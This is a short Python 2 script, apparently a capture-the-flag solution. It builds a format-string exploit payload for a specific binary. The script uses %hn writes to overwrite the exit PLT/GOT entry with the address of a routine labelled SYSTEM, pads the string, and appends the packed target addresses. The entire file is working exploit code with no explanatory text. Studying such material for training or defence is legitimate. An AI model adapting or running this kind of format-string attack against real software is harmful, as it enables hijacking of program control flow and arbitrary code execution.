import struct

SYSTEM = 0x400a85
EXIT_PLT = 0x601228

def pad(s):
    return s+"X"*(115 - len(s) - 16)

exploit = ""
exploit += "BBBBCCCC"
exploit += "%{}x".format(0x40 - len(exploit))
exploit += "%8$hn"
exploit += "%{}x".format(0x0a85 - 0x40)
exploit += "%9$hn"
exploit = pad(exploit)
exploit += struct.pack("Q", EXIT_PLT + 2)
exploit += struct.pack("Q", EXIT_PLT)

print pad(exploit)
